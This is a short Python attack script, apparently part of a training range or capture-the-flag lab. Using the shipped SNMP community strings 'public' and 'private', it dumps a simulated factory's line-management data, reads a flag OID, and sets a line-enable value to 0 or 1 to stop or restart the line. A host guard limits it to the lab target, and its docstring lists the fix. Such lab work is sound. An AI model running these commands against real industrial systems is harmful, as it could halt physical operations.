#!/usr/bin/env python3
"""Widget Works line-management SNMP box (Phase 3b management plane).

    snmp_attack.py walk     # dump the line-management subtree with `public`
    snmp_attack.py flag     # read the reconciliation key OID
    snmp_attack.py stop     # set lineEnable=0 with the write community -> line stops
    snmp_attack.py start    # set it back

A real net-snmp agent with the shipped community strings. `public` reads,
`private` writes. Same physical result as the Modbus path, a different plane.
Fix: SNMPv3 auth+priv, no default communities, no write from the enterprise.
"""
from __future__ import annotations

import subprocess
import sys

sys.path.insert(0, "/opt/pktr/scripts")
from targets import guard  # noqa: E402

HOST = "factory-snmp"
BASE = ".1.3.6.1.4.1.53864.1"
LINE_ENABLE = f"{BASE}.1.0"
OPS_NOTE = f"{BASE}.3.0"


def _run(args):
    print("$ " + " ".join(args))
    subprocess.run(args)


def main():
    guard(HOST)
    act = sys.argv[1] if len(sys.argv) > 1 else "walk"
    if act == "walk":
        _run(["snmpwalk", "-v2c", "-c", "public", HOST, BASE])
        # sysLocation.0 / sysContact.0 by number (the box ships a hint in them)
        _run(["snmpget", "-v2c", "-c", "public", HOST,
              ".1.3.6.1.2.1.1.6.0", ".1.3.6.1.2.1.1.4.0"])
    elif act == "flag":
        _run(["snmpget", "-v2c", "-c", "public", "-Ovq", HOST, OPS_NOTE])
    elif act == "stop":
        _run(["snmpset", "-v2c", "-c", "private", HOST, LINE_ENABLE, "i", "0"])
        print("[snmp] line-enable set to 0. Watch the Widget Works on the map.")
    elif act == "start":
        _run(["snmpset", "-v2c", "-c", "private", HOST, LINE_ENABLE, "i", "1"])
    else:
        sys.exit("usage: snmp_attack.py walk|flag|stop|start")


if __name__ == "__main__":
    main()
